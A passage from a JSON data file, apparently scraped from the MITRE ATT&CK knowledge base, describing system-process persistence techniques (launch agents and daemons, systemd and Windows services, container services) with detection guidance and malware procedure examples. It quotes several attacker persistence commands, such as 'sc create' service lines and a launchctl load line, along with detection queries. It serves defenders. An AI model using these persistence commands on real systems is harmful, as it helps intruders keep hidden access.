      "Use of Authentication, Authorization, and Accounting (AAA) systems will limit actions administrators can perform and provide a history of user actions to detect unauthorized use and abuse. TACACS+ can keep control over which commands administrators are permitted to use through the configuration of authentication and command authorization.[6][7]"
    ]
  },
  "T1543": {
    "Name": "Create or Modify System Process",
    "Description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.[1]On macOS, launchd processes known asLaunch DaemonandLaunch Agentare run to finish system initialization and load user specific parameters.[2]Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.[3]",
    "Detects": [
      "Command-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques.",
      "Monitor for newly constructed containers that repeatedly execute malicious payloads as part of persistence or privilege escalation.",
      "Monitor for new service driver installations and loads (ex: Sysmon Event ID 6) that are not part of known software update/patch cycles.",
      "Monitor for newly constructed files that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence.",
      "Monitor for changes to files associated with system-level processes.",
      "Monitor for API calls that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence.",
      "New, benign system processes may be created during installation of new software.",
      "Monitor for newly constructed services/daemons that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence.",
      "Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline.",
      "Monitor for newly constructed windows registry keys that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence.",
      "Monitor for changes to windows registry keys and/or values that may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence."
    ],
    "Procedure Examples": [
      "Akira _v2can create a child process for encryption.[4]",
      "BOLDMOVEcan free all resources and terminate itself on victim machines.[5]",
      "Exaramel for Linuxhas a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.[6]",
      "IMAPLoadermodifies Windows tasks on the victim machine to reference a retrieved PE file through a path modification.[7]",
      "LITTLELAMB.WOOLTEAcan initialize itself as a daemon to run persistently in the background.[8]",
      "LunarMailcan create an arbitrary process with a specified command line and redirect its output to a staging directory.[9]"
    ]
  },
  "T1543.001": {
    "Name": "Create or Modify System Process:Launch Agent",
    "Description": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in/System/Library/LaunchAgents,/Library/LaunchAgents, and~/Library/LaunchAgents.[1][2][3]Property list files use theLabel,ProgramArguments, andRunAtLoadkeys to identify the Launch Agent's name, executable location, and execution time.[4]Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.Launch Agents can also be executed using theLaunchctlcommand.Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with theRunAtLoadorKeepAlivekeys set totrue.[5][6]The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.[7][8]",
    "Detects": [
      "Ensure Launch Agent'sProgramArgumentskey pointing to executables located in the/tmpor/sharedfolders are in alignment with enterprise policy. Ensure all Launch Agents with theRunAtLoadkey set totrueare in alignment with policy.",
      "Monitor for newly constructed files that may create or modify launch agents to repeatedly execute malicious payloads as part of persistence.",
      "Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.",
      "Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s KnockKnock application.",
      "Monitor for changes made to launch agents to repeatedly execute malicious payloads as part of persistence."
    ],
    "Procedure Examples": [
      "Bundlorecan persist via a LaunchAgent.[9]",
      "Calistoadds a .plist file to the /Library/LaunchAgents folder to maintain persistence.[10]",
      "CoinTickercreates user launch agents named .espl.plist and com.apple.[random string].plist to establish persistence.[11]",
      "CookieMinerhas installed multiple new Launch Agents in order to maintain persistence for cryptocurrency mining software.[12]",
      "CrossRATcreates a Launch Agent on macOS.[13]",
      "Cuckoo Stealercan achieve persistence by creating launch agents to repeatedly execute malicious payloads.[14][15]",
      "Daclscan establish persistence via a LaunchAgent.[16][17]",
      "Dokinstalls two LaunchAgents to redirect all network traffic with a randomly generated name for each plist file maintaining the formatcom.random.name.plist.[18][19]",
      "FruitFlypersists via a Launch Agent.[18]",
      "Green Lambertcan create aLaunch Agentwith theRunAtLoadkey-value pair set totrue, ensuring thecom.apple.GrowlHelper.plistfile runs every time a user logs in.[20][21]",
      "Keydnapuses a Launch Agent to persist.[22]",
      "TheKomplextrojan creates a persistent launch agent called with$HOME/Library/LaunchAgents/com.apple.updates.plistwithlaunchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist.[5]",
      "MacMainstalls acom.apple.softwareupdate.plistfile in the/LaunchAgentsfolder with theRunAtLoadvalue set totrue. Upon user login,MacMais executed from/var/root/.local/softwareupdatewith root privileges. Some variations also include theLimitLoadToSessionTypekey with the valueAqua, ensuring theMacMaonly runs when there is a logged in GUI user.[23][24]",
      "macOS.OSAMinerhas placed aStripped Payloadswith aplistextension in theLaunch Agent's folder.[25]",
      "MacSpypersists via a Launch Agent.[18]",
      "NETWIREcan use launch agents for persistence.[26]",
      "OSX_OCEANLOTUS.Dcan create a persistence file in the folder/Library/LaunchAgents.[27][28]",
      "Protonpersists via Launch Agent.[18]",
      "ThiefQuestinstalls a launch item using an embedded encrypted launch agent property list template. The plist file is installed in the~/Library/LaunchAgents/folder and configured with the path to the persistent binary located in the~/Library/folder.[29]"
    ]
  },
  "T1543.002": {
    "Name": "Create or Modify System Process:Systemd Service",
    "Description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources.[1]Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.Systemd utilizes unit configuration files with the.servicefile extension to encode information about a service's process. By default, system level unit files are stored in the/systemd/systemdirectory of the root owned directories (/). User level unit files are stored in the/systemd/userdirectories of the user owned directories ($HOME).[2]Inside the.serviceunit files, the following directives are used to execute commands:[3]ExecStart,ExecStartPre, andExecStartPostdirectives execute when a service is started manually bysystemctlor on system start if the service is set to automatically start.ExecReloaddirective executes when a service restarts.ExecStop,ExecStopPre, andExecStopPostdirectives execute when a service is stopped.Adversaries have created new service files, altered the commands a.servicefile’s directive executes, and modified the user directive a.servicefile executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem.[4][5][6]The.servicefile’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions.Systemd services can be created via systemd generators, which support the dynamic generation of unit files. Systemd generators are small executables that run during boot or configuration reloads to dynamically create or modify systemd unit files by converting non-native configurations into services, symlinks, or drop-ins (i.e.,Boot or Logon Initialization Scripts).[7][8]",
    "Detects": [
      "Suspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services:systemctl list-units -–type=service –all. Auditing the execution and command-line arguments of the 'systemctl' utility, as well related utilities such as/usr/sbin/servicemay reveal malicious systemd service execution.",
      "Systemd service unit files may be detected by auditing file creation and modification events within the/etc/systemd/system,/usr/lib/systemd/system/, and/home/$username/.config/systemd/user/directories, as well as associated symbolic links. Systemd generators may be placed in system-wide directories such as/run/systemd/system-generators/,/etc/systemd/system-generatorsor user-specific directories such as/run/systemd/user-generators/.",
      "Systemd service unit files may be detected by auditing file creation and modification events within the/etc/systemd/system,/usr/lib/systemd/system/, and/home/$username/.config/systemd/user/directories, as well as associated symbolic links. Systemd generators may be modified in system-wide directories such as/run/systemd/system-generators/,/etc/systemd/system-generatorsor user-specific directories such as/run/systemd/user-generators/.",
      "Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.",
      "Monitor for new constructed systemd services to repeatedly execute malicious payloads as part of persistence.",
      "Analyze the contents of.servicefiles present on the file system and ensure that they refer to legitimate, expected executables."
    ],
    "Procedure Examples": [
      "During the2022 Ukraine Electric Power Attack,Sandworm Teamconfigured Systemd to maintain persistence of GOGETTER, specifying theWantedBy=multi-user.targetconfiguration to run GOGETTER when the system begins accepting user logins.[9]",
      "Exaramel for Linuxhas a hardcoded location under systemd that it uses to achieve persistence if it is running as root.[10][11]",
      "Fysbishas established persistence using a systemd service.[12]",
      "Gomircreates a systemd service namedsyslogdfor persistence.[13]",
      "Hildegardhas started a monero service.[14]",
      "Pupycan be used to establish persistence using a systemd service.[15]",
      "Rockehas installed a systemd service script to maintain persistence.[4]",
      "Depending on the Linux distribution and when executing with root permissions,RotaJakiromay install persistence using a.servicefile under the/lib/systemd/system/folder.[16]",
      "SysUpdatecan copy a script to the user owned/usr/lib/systemd/system/directory with a symlink mapped to arootowned directory,/etc/ystem/system, in the unit configuration file'sExecStartdirective to establish persistence and elevate privileges.[17]",
      "TeamTNThas established persistence through the creation of a cryptocurrency mining system service usingsystemctl.[18][19]"
    ]
  },
  "T1543.003": {
    "Name": "Create or Modify System Process:Windows Service",
    "Description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.[1]Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex:.sys) to disk, the payload can be loaded and registered viaNative APIfunctions such asCreateServiceW()(or manually via functions such asZwLoadDriver()andZwSetValueKey()), by creating the required service Registry values (i.e.Modify Registry), or by using command-line utilities such asPnPUtil.exe.[2][3][4]Adversaries may leverage these drivers asRootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part ofExploitation for Privilege Escalation.[5][4]Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services throughService Execution.To make detection analysis more challenging, malicious services may also incorporateMasquerade Task or Service(ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create ‘hidden’ services (i.e.,Hide Artifacts), for example by using thesc sdsetcommand to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such asGet-Service,sc query, andservices.exe.[6][7]",
    "Detects": [
      "Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such asWindows Management InstrumentationandPowerShell, so additional logging may need to be configured to gather the appropriate data. Also collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.",
      "Monitor for new service driver installations and loads (ex: Sysmon Event ID 6) that are not part of known software update/patch cycles.Note: Sysmon Event ID 6 (driver load) provides information on whether the loaded driver was signed with a valid signature (via theSignatureandSignatureStatusfields). As such, one way to help reduce the volume of alerts and false positives associated with this event is to filter and exclude any driver load events signed by common and legitimate publishers like Microsoft.",
      "Adversaries may modify the binary file for an existing service to achievePersistencewhile potentiallyDefense Evasion. If a newly created or modified runs as a service, it may indicate APT activity. However, services are frequently installed by legitimate software. A well-tuned baseline is essential to differentiating between benign and malicious service modifications. Look for events where a file was created and then later run as a service. In these cases, a new service has been created or the binary has been modified. Many programs, such as msiexec.exe, do these behaviors legitimately and can be used to help validate legitimate service creations/modifications.",
      "Monitor for several ways that code can execute on a remote host. One of the most common methods is via the Windows Service Control Manager (SCM), which allows authorized users to remotely create and modify services. Several tools, such asPsExec, use this functionality.When a client remotely communicates with the Service Control Manager, there are two observable behaviors. First, the client connects to the RPC Endpoint Mapper over 135/tcp. This handles authentication, and tells the client what port the endpoint—in this case the SCM—is listening on. Then, the client connects directly to the listening port on services.exe. If the request is to start an existing service with a known command line, the the SCM process will run the corresponding command.This compound behavior can be detected by looking for services.exe receiving a network connection and immediately spawning a child process.",
      "Monitor for API calls that may create or modify Windows services (ex:CreateServiceW()) to repeatedly execute malicious payloads as part of persistence.",
      "Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.Windows runs the Service Control Manager (SCM) within the process services.exe. Windows launches services as independent processes or DLL loads within a svchost.exe group. To be a legitimate service, a process (or DLL) must have the appropriate service entry point SvcMain. If an application does not have the entry point, then it will timeout (default is 30 seconds) and the process will be killed.To survive the timeout, adversaries and red teams can create services that direct to cmd.exe with the flag /c, followed by the desired command. The /c flag causes the command shell to run a command and immediately exit. As a result, the desired program will remain running and it will report an error starting the service. This analytic will catch that command prompt instance that is used to launch the actual malicious executable. Additionally, the children and descendants of services.exe will run as a SYSTEM user by default.Note: Create a baseline of services seen over the last 30 days and a list of services seen today. Remove services in the baseline from services seen today, leaving a list of new services. Returns all processes named cmd.exe that have services.exe as a parent process. Because this should never happen, the /c flag is redundant in the search.Analytic 2 - Services launching CMD(sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=\"1\") OR (sourcetype=WinEventLog:Security EventCode=\"4688\") Image=\"cmd.exe\" and ParentImage=\"services.exe\"",
      "Creation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045[163][164]), especially those associated with unknown/abnormal drivers. New, benign services may be created during installation of new software.Analytic 1 - Creation of new services with unusual directory paths such as temporal files in APPDATA(sourcetype=WinEventLog:Security EventCode=\"4697\") OR (sourcetype=WinEventLog:System EventCode=\"7045\") | where ServiceFilePath LIKE \"%APPDATA%\" OR ServiceImage LIKE \"%PUBLIC%\"",
      "Monitor for changes made to Windows services to repeatedly execute malicious payloads as part of persistence.",
      "Monitor for new constructed windows registry keys that may create or modify Windows services to repeatedly execute malicious payloads as part of persistence.Analytic 1 - Creation of the HKLM\\System\\CurrentControlSet\\Services Registry keysourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=\"12\" TargetObject=\"HKLM\\System\\CurrentControlSet\\Services*\"",
      "Look for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry atHKLM\\SYSTEM\\CurrentControlSet\\Services. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.[165]Analytic 1 - Modification of the HKLM\\System\\CurrentControlSet\\Services Registry key(sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode IN (13, 14) EventType= \"SetValue\" TargetObject=\"HKLM\\System\\CurrentControlSet\\Services*\" | where RegistryKeyPath LIKE \"%ImagePath%\" OR    RegistryKeyPath LIKE \"%Type%\" OR   RegistryKeyPath LIKE \"%DisplayName%\" OR   RegistryKeyPath LIKE \"%Objectname%\""
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamused an arbitrary system service to load at system boot for persistence forIndustroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary.[8]",
      "Agriushas deployedIPsec Helpermalware post-exploitation and registered it as a service for persistence.[9]",
      "Anchorcan establish persistence by creating a service.[10]",
      "AppleJeuscan install itself as a service.[11]",
      "AnAPT19Port 22 malware variant registers itself as a service.[12]",
      "APT3has a tool that creates a new service for persistence.[13]",
      "APT32modified Windows Services to ensure PowerShell scripts were loaded on the system.APT32also creates a Windows service to establish persistence.[14][15][16]",
      "APT38has installed a new Windows service to establish persistence.[17]",
      "APT41modified legitimate Windows services to install malware backdoors.[18][19]APT41created the StorSyncSvc service to provide persistence forCobalt Strike.[20]",
      "APT41 DUSTused Windows Services with names such asWindows Defendfor persistence ofDUSTPAN.[21]",
      "Aquatic Pandacreated new Windows services for persistence that masqueraded as legitimate Windows services via name change.[22]",
      "Attor's dispatcher can establish persistence by registering a new service.[23]",
      "AuditCredis installed as a new service on the system.[24]",
      "Bankshotcan terminate a specific process by its process id.[25][26]",
      "BBSRATcan modify service configurations.[27]",
      "Bisonalhas been modified to be used as a Windows service.[28]",
      "BitPaymerhas attempted to install itself as a service to maintain persistence.[29]",
      "Black Bastacan create a new service to establish persistence.[30][31]",
      "BlackBytemodified multiple services on victim machines to enable encryption operations.[32]BlackBytehas installed tools such as AnyDesk as a service on victim machines.[33]",
      "One variant ofBlackEnergycreates a new service using either a hard-coded or randomly generated name.[34]",
      "Blue Mockingbirdhas made their XMRIG payloads persistent as a Windows Service.[35]",
      "Bribainstalls a service pointing to a malicious DLL dropped to disk.[36]",
      "Carbanakmalware installs itself as a service to provide persistence and SYSTEM privileges.[37]",
      "Carbonestablishes persistence by creating a service and naming it based off the operating system version running on the current machine.[38]",
      "Catchamasadds a new service named NetAdapter to establish persistence.[39]",
      "Cinnamon Tempesthas created system services to establish persistence for deployed tooling.[40]",
      "Clamblingcan register itself as a system service to gain persistence.[41]",
      "Cobalt Grouphas created new services to establish persistence.[42]",
      "Cobalt Strikecan install a new service.[43]",
      "Confickercopies itself into the%systemroot%\\system32directory and registers as a service.[44]",
      "CosmicDukeuses Windows services typically named \"javamtsup\" for persistence.[45]",
      "One persistence mechanism used byCozyCaris to register itself as a Windows service.[46]",
      "Cubacan modify services by using theOpenServiceandChangeServiceConfigfunctions.[47]",
      "DarkVishnyacreated new services for shellcode loaders distribution.[48]",
      "DCSrvhas created new services for persistence by modifying the Registry.[49]",
      "Dtrackcan add a service called WBService to establish persistence.[50]",
      "Duqucreates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key.[51]",
      "DUSTPANcan persist as a Windows Service in operations.[21]",
      "Dyreregisters itself as a service by adding several Registry keys.[52]",
      "Earth Luscacreated a service using the commandsc create \"SysUpdate\" binpath= \"cmd /c start \"[file path]\"\"&&sc config \"SysUpdate\" start= auto&&netstart SysUpdatefor persistence.[53]",
      "Eliseconfigures itself as a service.[54]",
      "Emissaryis capable of configuring itself as a service.[55]",
      "Emotethas been observed creating new services to maintain persistence.[56][57][58]",
      "Empirecan utilize built-in modules to modify service binaries and restore them to their original state.[59]",
      "TheExaramel for Windowsdropper creates and starts a Windows service named wsmprovav with the description \"Windows Check AV.\"[60]",
      "FALLCHILLhas been installed as a Windows service.[11]",
      "FIN7created new Windows services and added them to the startup directories for persistence.[61]",
      "FinFishercreates a new Windows service with the malicious executable for persistence.[62][63]",
      "FunnyDreamhas established persistence by runningsc.exeand by setting theWSearchservice to run automatically.[64]",
      "Gelsemiumcan drop itself inC:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dllas an alternative Print Processor to be loaded automatically when the spoolsv Windows service starts.[65]",
      "gh0st RATcan create a new service to establish persistence.[66][67]",
      "GoldenSpyhas established persistence by running in the background as an autostart service.[68]",
      "GreyEnergychooses a service, drops a DLL file, and writes it to that serviceDLL Registry key.[69]",
      "Hannotogcreates a new service for persistence.[70]",
      "hcdLoaderinstalls itself as a service for persistence.[71][72]",
      "HermeticWipercan load drivers by creating a new service using theCreateServiceWAPI.[3]",
      "Hydraqcreates new services to establish persistence.[73][74][75]",
      "Industroyercan use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary.[8]",
      "SomeInnaputRATvariants create a new Windows service to establish persistence.[76]",
      "InvisiMolecan register a Windows service named CsPower as part of its execution chain, and a Windows service named clr_optimization_v2.0.51527_X86 to achieve persistence.[5]",
      "JHUHUGIThas registered itself as a service to establish persistence.[77]",
      "Kazuarcan install itself as a new service.[78]",
      "Ke3changbackdoor RoyalDNS established persistence through adding a service calledNwsapagent.[79]",
      "KeyBoyinstalls a service pointing to a malicious DLL dropped to disk.[80]",
      "Kimsukyhas created new services for persistence.[81][82]",
      "KONNIhas registered itself as a service using its export function.[83]",
      "Kwampirscreates a new service named WmiApSrvEx to establish persistence.[84]",
      "SeveralLazarus Groupmalware families install themselves as new services.[85][86]",
      "LockBit 3.0can install system services for persistence.[87]",
      "Lotus Blossomhas configured tools such asSagerunexto run as Windows services.[88]",
      "LoudMinercan automatically launch a Linux virtual machine as a service at startup if the AutoStart option is enabled in the VBoxVmService configuration file.[89]",
      "MoonWindinstalls itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.[90]",
      "Naidcreates a new service to establish.[91]",
      "Nebulaecan create a service to establish persistence.[92]",
      "Nerexcreates a Registry subkey that registers a new service.[93]",
      "Nidirancan create a new service named msamger (Microsoft Security Accounts Manager).[94]",
      "NightClubhas created a Windows service namedWmdmPmSpto establish persistence.[95]",
      "Ninjacan create the serviceshttpsvcandw3esvcfor persistence .[96]",
      "OilRighas used a compromised Domain Controller to create a service on a remote host.[97]",
      "To establish persistence,Okrumcan install itself as a new service named NtmSsvc.[98]",
      "DuringOperation CuckooBees, the threat actors modified theIKEEXTandPrintNotifyWindows services for persistence.[99]",
      "DuringOperation Honeybee, threat actors installed DLLs and backdoors as Windows services.[100]",
      "Pandorahas the ability to gain system privileges through Windows services.[101]",
      "PingPullhas the ability to install itself as a service.[102]",
      "PipeMoncan establish persistence by registering a malicious DLL as an alternative Print Processor which is loaded when the print spooler service starts.[103]",
      "PlugXcan be added as a service to establish persistence.PlugXalso has a module to change service configurations as well as start, control, and delete services.[104][105][106][107][108]",
      "PoisonIvycreates a Registry subkey that registers a new service.PoisonIvyalso creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.[109]",
      "PowerSploitcontains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.[110][111]",
      "PROMETHIUMhas created new services and modified existing services for persistence.[112]",
      "PsExeccan leverage Windows services to escalate privileges from administrator to SYSTEM with the-sargument.[113]",
      "QakBotcan remotely create a temporary service on a target host.[114]",
      "Ragnar Lockerhas used sc.exe to create a new service for the VirtualBox driver.[115]",
      "RainyDaycan use services to establish persistence.[92]",
      "RawPOSinstalls itself as a service to maintain persistence.[116][117][118]",
      "RDAThas created a service when it is installed on the victim machine.[119]",
      "Reaverinstalls itself as a new service.[120]",
      "SomeSakulasamples install themselves as services for persistence by calling WinExec with thenet startargument.[121]",
      "Samuraican create a service atHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHostto trigger execution and maintain persistence.[96]",
      "Seasaltis capable of installing itself as a service.[122]",
      "Shamooncreates a new service named \"ntssrv\" to execute the payload. Newer versions create the \"MaintenaceSrv\" and \"hdv_725x\" services.[123][124]",
      "ShimRathas installed a Windows service to maintain persistence on victim machines.[125]",
      "SILENTTRINITYcan establish persistence by creating a new service.[126]",
      "SLOTHFULMEDIAhas created a service on victim machines named \"TaskFrame\" to establish persistence.[127]",
      "STARWHALEhas the ability to create the following Windows service to establish persistence on an infected host:sc create Windowscarpstss binpath= \"cmd.exe /c cscript.exe c:\\\\windows\\\\system32\\\\w7_1.wsf humpback_whale\" start= \"auto\" obj= \"LocalSystem\".[128]",
      "StreamExestablishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.[129]",
      "StrongPityhas created new services and modified existing services for persistence.[130]",
      "Stuxnetuses a driver registered as a boot start service as the main load-point.[131]",
      "SUGARUSHhas created a service namedService1for persistence.[132]",
      "SysUpdatecan create a service to establish persistence.[101]",
      "If running as administrator,TDTESSinstalls itself as a new service named bmwappushservice to establish persistence.[133]",
      "TeamTNThas used malware that adds cryptocurrency miners as a service.[134]",
      "TEARDROPran as a Windows service from thec:\\windows\\syswow64folder.[135][136]",
      "Threat Group-3390's malware can create a new service, sometimes naming it after the config information, to gain persistence.[137][138]",
      "ThreatNeedlecan run in memory and register its payload as a Windows service.[139]",
      "TinyZBotcan install as a Windows service for persistence.[140]",
      "TrickBotestablishes persistence by creating an autostart service that allows it to run whenever the machine boots.[141]",
      "Tropic Trooperhas installed a service pointing to a malicious DLL dropped to disk.[142]",
      "TYPEFRAMEvariants can add malicious DLL modules as new services.TYPEFRAMEcan also delete services from the victim’s machine.[143]",
      "Uroburoshas registered a service, typically namedWerFaultSvc, to decrypt and find a kernel driver and kernel driver loader to maintain persistence.[144]",
      "Ursnifhas registered itself as a system service in the Registry for automatic execution at system startup.[145]",
      "Volgmerinstalls a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry. SomeVolgmervariants also install .dll files as services with names generated by a list of hard-coded strings.[146][147][148]",
      "WannaCrycreates the service \"mssecsvc2.0\" with the display name \"Microsoft Security Center (2.0) Service.\"[149][150]",
      "WastedLockercreated and established a service that runs until the encryption process is complete.[151]",
      "Wiarpcreates a backdoor through which remote attackers can create a service.[152]",
      "Wingbirduses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.[153][154]",
      "Winnti for Windowssets its DLL file as a new service in the Registry to establish persistence.[155]",
      "Wizard Spiderhas installedTrickBotas a service named ControlServiceA in order to establish persistence.[156][157]",
      "ZeroTcan add a new service to ensurePlugXpersists on the system when delivered as another payload onto the system.[108]",
      "ZLibcreates Registry keys to allow itself to run as various services.[158]",
      "zwShellhas established persistence by adding itself as a new service.[159]",
      "ZxShellcan create a new service using the service parser function ProcessScCommand.[160]"
    ]
  },
  "T1543.004": {
    "Name": "Create or Modify System Process:Launch Daemon",
    "Description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in/System/Library/LaunchDaemons/and/Library/LaunchDaemons/. Required Launch Daemons parameters include aLabelto identify the task,Programto provide a path to the executable, andRunAtLoadto specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.[1][2][3]Adversaries may install a Launch Daemon configured to execute at startup by using theRunAtLoadparameter set totrueand theProgramparameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e.Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.[4][5]Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such asusr/local/binto become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.[6][7]",
    "Detects": [
      "Some legitimate LaunchDaemons point to unsigned code that could be exploited. For Launch Daemons with theRunAtLoadparameter set to true, ensure theProgramparameter points to signed code or executables are in alignment with enterprise policy. Some parameters are interchangeable with others, such asProgramandProgramArgumentsparameters but one must be present.[3]",
      "Monitor for new files added to the/Library/LaunchDaemons/folder. The System LaunchDaemons are protected by SIP.",
      "Monitor files for changes that may create or modify Launch Daemons to execute malicious payloads as part of persistence.",
      "Monitor for newly executed processes that may create or modify Launch Daemons to execute malicious payloads as part of persistence.",
      "Monitor for newly constructed services may create or modify Launch Daemons to execute malicious payloads as part of persistence.",
      "Monitor services for changes made to Launch Daemons to execute malicious payloads as part of persistence."
    ],
    "Procedure Examples": [
      "AppleJeushas placed a plist file within theLaunchDaemonsfolder and launched it manually.[8][9]",
      "Bundlorecan persist via a LaunchDaemon.[10]",
      "COATHANGERwill create a daemon for timed check-ins with command and control infrastructure.[11]",
      "Daclscan establish persistence via a Launch Daemon.[12][13]",
      "Green Lambertcan add a plist file in theLibrary/LaunchDaemonsto establish persistence.[14][15]",
      "LoudMineradds plist files with the naming formatcom.[random_name].plistin the/Library/LaunchDaemonsfolder with the RunAtLoad and KeepAlive keys set totrue.[16]",
      "If running withrootpermissions,OSX_OCEANLOTUS.Dcan create a persistence file in the folder/Library/LaunchDaemons.[17][18]",
      "When running with root privileges after aLaunch Agentis installed,ThiefQuestinstalls a plist file to the/Library/LaunchDaemons/folder with theRunAtLoadkey set totrueestablishing persistence as a Launch Daemon.[19]",
      "XCSSETuses the ssh launchdaemon to elevate privileges, bypass system controls, and enable remote access to the victim.[20]"
    ]
  },
  "T1543.005": {
    "Name": "Create or Modify System Process:Container Service",
    "Description": "Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.For example, by using thedocker runorpodman runcommand with therestart=alwaysdirective, a container can be configured to persistently restart on the host.[1]A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.[2]In Kubernetes environments, DaemonSets allow an adversary to persistentlyDeploy Containers on all nodes, including ones added later to the cluster.[3][4]Pods can also be deployed to specific nodes using thenodeSelectorornodeNamefields in the pod spec.[5][6]Note that containers can also be configured to run asSystemd Services.[7][8]",
    "Detects": [
      "Monitor for suspicious uses of the docker or podman command, such as attempts to mount the root filesystem of the host.",
      "Monitor for newly constructed containers that repeatedly execute malicious payloads as part of persistence or privilege escalation."
    ],
    "Procedure Examples": [
      "Where possible, consider enforcing the use of container services in rootless mode to limit the possibility of privilege escalation or malicious effects on the host running the container.",
      "Limit access to utilities such as docker to only users who have a legitimate need, especially if using docker in rootful mode. In Kubernetes environments, only grant privileges to deploy pods to users that require it."
    ]
  },
  "T1546": {
    "Name": "Event Triggered Execution",
